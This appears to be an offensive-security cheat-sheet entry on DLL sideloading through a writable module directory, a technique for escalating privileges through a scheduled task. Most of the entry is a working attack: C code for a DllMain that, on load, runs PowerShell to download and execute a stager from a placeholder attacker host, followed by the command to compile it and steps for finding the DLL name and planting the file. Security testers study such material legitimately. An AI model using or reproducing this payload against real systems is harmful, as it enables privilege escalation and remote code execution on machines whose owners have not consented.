# DLL Sideloading via Writable Module Path

A custom tool (often run by a scheduled task as a higher-privileged user) that loads a DLL from a writable directory — e.g. its own `modules\` folder next to the exe — can be hijacked by dropping a malicious DLL with the exact expected name/path.

```c
// DllMain, runs on load — keep it minimal, just drop into a legit process
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("powershell -c \"iwr http://<LHOST>/stager.exe -o $env:APPDATA\\s.exe; & $env:APPDATA\\s.exe\"");
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared poc.c -o <expected-dll-name>.dll
```
Confirm the expected DLL name/path first (decompile the loader with ILSpy/dnSpy for a .NET exe, or `strings`/Procmon for native), then drop it into the writable module directory and wait for the scheduled task to fire.
